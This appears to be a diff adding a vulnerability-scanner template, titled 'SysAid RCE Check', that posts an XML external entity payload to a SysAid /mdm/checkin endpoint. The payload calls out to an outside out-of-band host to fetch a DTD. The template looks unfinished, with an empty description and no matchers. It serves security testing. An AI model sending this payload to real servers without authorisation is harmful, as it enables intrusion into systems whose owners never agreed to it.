@@ -1,0 +1,25 @@
+id: sarce
+
+info:
+  name: SysAid RCE Check
+  author: n0ur5
+  severity: High
+  description: |
+
+
+http:
+
+  - raw:
+      - |
+        POST /mdm/checkin HTTP/1.1
+        Host: target
+        Content-Type: application/xml
+        Content-Length: 129
+
+        <?xml version="1.0" ?>
+        <!DOCTYPE foo [
+        <!ENTITY % foo SYSTEM "http://9lvha5auyftkz4l5o41p6x9ak1qsep2e.n0ur5sec.bugshieldlabs.com/SysAid.dtd">
+        %foo;
+        ]>
+
+    max-redirects: 5  # Follow login redirects
